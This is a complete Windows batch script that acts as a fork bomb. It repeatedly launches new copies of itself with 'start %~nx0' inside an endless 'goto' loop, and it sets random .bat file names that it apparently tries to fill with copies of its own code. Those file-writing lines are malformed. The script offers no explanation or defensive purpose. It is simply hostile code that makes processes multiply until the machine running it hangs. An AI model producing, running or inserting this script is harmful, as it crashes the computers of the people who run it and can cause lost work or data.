:a
start %~nx0
set var=%random%-%random%-%random%-%random%.bat

:a > %var%
start %~nx0 >> %var%
set var=%random%.bat >> %var%
goto a >> %var%

goto a